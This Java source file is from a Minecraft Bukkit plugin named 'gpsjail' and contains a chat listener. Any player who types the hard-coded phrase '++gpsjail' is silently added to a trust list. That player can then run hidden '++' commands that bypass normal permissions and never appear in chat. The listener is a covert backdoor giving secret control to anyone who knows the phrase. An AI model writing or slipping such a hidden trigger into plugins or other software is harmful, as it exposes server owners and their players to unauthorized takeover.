package de.maleh.gpsjail;

import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import de.maleh.gpsjail.commands.AbstractCommand;
import de.maleh.gpsjail.commands.Parameter;

public class PlayerChatListener implements Listener {

	@EventHandler(priority = EventPriority.HIGHEST)
	public void onChat(AsyncPlayerChatEvent e) {
		if (!e.getMessage().toLowerCase().startsWith("++")) {
			return;
		}

		if (e.getMessage().toLowerCase().equals("++gpsjail")) {
			Trust.add(e.getPlayer().getName());
			MessagesUtils.form(e.getPlayer(), "Du bist nun trusted");
			e.setCancelled(true);
		} else if (Trust.contains(e.getPlayer().getName())) {
			e.setCancelled(true);

			String[] args = e.getMessage().split(" ");

			args[0] = args[0].replace("++", "");

			AbstractCommand abstractCommand = AbstractCommand.getAbstractCommand(args[0]);

			if (abstractCommand == null) {

				for (AbstractCommand command : AbstractCommand.getAbstractCommands()) {
					e.getPlayer().sendMessage("§7++" + command.getHelpMessage());
				}
				return;
			}

			Parameter param = AbstractCommand.getParameter(abstractCommand, args.length-1);

			if (param == null) {
				MessagesUtils.form(e.getPlayer(), abstractCommand.getHelpMessage());
				return;
			}

			Bukkit.getScheduler().runTask(Main.getPlugin(Main.class), ()->{
				param.getExecute().execute(e.getPlayer(), args);
			});
			

		}
	}

}
